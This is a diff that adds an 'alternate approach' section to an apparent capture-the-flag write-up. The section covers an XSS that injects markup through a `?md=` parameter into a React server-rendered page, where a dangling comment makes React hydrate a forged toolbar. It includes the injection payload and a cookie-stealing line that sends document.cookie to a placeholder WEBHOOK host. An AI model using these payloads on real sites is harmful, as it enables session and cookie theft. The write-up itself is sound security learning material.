@@ -411,6 +411,47 @@ The whole value passed to `?md=` needs to be percent-encoded in the URL. That's 
 
 ---
 
+## Alternate approach (what Jorian did)
+
+<img src="/assets/media/toolbars/13-jorian-discord.png" alt="Jorian's Discord message describing his approach: editing the response HTML of the input to a value with alert, then building the payload with a dangling open comment, ending with RSC boundary markers" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">
+
+Same core technique, different ending. Instead of reconstructing the page with `</header><main>...</main>`, Jorian ended the payload with `<!--$--><!--`:
+
+```
+?md=</div></section><section draggable="true" class="toolbar"><div>...</div><div>x</div><div><img src="/calc.png" alt="Logo"></div><div><input placeholder="2+2" value="alert(1)">&nbsp;=&nbsp;<code></code></div></section><!--$--><!--
+```
+
+`<!--$-->` is a React Suspense boundary marker embedded in the SSR HTML. `<!--` opens an HTML comment that swallows all the remaining SSR closing tags (`</div></div></section>` from MarkdownBar, `</header>`, `<main>...</main>`). Those tags never produce DOM nodes. React has no structural mismatch to react to, walks to `header.childNodes[3]`, adopts the fake section, and `useEffect` fires.
+
+The XSS proof is `alert(1)`. `alert()` returns `undefined`. `String(undefined)` = `"undefined"`. CalcBar displays that in `<code>`. Empty `<code>` means eval threw. `= undefined` means it ran.
+
+<img src="/assets/media/toolbars/12-jorian-alert-undefined.jpg" alt="Working exploit: CalcBar shows alert(1) in the input and = undefined as the result, page looks completely normal" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">
+
+No popup, no title change. The only sign is `= undefined` in the CalcBar.
+
+`alert(1)` has no HTML special characters so the unquoted attribute value also works:
+
+```html
+<input placeholder="2+2" value=alert(1)>&nbsp;=&nbsp;<code></code>
+```
+
+For cookie exfiltration the value needs `'` characters, so double-quoting is the right call:
+
+```html
+<input value="location.href='https://WEBHOOK?c='+document.cookie">
+```
+
+Console verification:
+
+```js
+document.querySelector('header').children[3].querySelector('input').value
+// => "alert(1)"
+document.querySelector('header').children[3].querySelector('code').textContent
+// => "undefined"
+```
+
+---
+
 ## Flag
 
 <img src="/assets/media/toolbars/06-flag-exfil.png" alt="Webhook showing the exfiltrated flag cookie" style="border:1px solid #ccc;max-width:100%;height:auto;display:block;margin:1.5em 0">
